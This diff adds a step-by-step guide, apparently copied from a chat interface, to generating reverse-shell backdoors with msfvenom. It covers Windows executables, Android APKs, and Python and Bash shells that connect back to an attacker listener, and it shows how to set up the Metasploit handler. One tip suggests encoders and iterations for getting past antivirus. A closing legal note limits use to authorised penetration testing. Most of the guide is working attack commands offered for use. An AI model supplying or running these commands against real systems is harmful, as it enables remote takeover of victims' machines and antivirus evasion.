@@ -1,0 +1,60 @@
+📌 Step-by-Step Guide to Use MSFVenom
+🔧 1. Open Terminal in Kali Linux
+bash
+Copy
+Edit
+sudo msfvenom --help
+This will show all available options and formats.
+
+💣 2. Basic Payload Syntax
+bash
+Copy
+Edit
+msfvenom -p <PAYLOAD> LHOST=<YOUR-IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT FILE>
+🎯 Common Examples
+✅ Windows Reverse Shell (EXE)
+bash
+Copy
+Edit
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o backdoor.exe
+✅ Android Reverse Shell (APK)
+bash
+Copy
+Edit
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk
+✅ Python Payload
+bash
+Copy
+Edit
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.py
+✅ Bash Shell
+bash
+Copy
+Edit
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw > shell.sh
+📡 3. Start Listener with Metasploit
+Launch msfconsole:
+bash
+Copy
+Edit
+sudo msfconsole
+Set Up the Handler:
+bash
+Copy
+Edit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+Replace payload if you're using Android, Python, Bash, etc.
+
+🧠 Tips
+Always match the payload and format to the target OS.
+
+Use -e for encoder, -i for iterations if bypassing antivirus.
+
+Use --platform and --arch for fine control.
+
+🛑 Legal Note:
+MSFVenom should only be used in legal environments, such as for penetration testing on systems you own or have explicit permission to test.
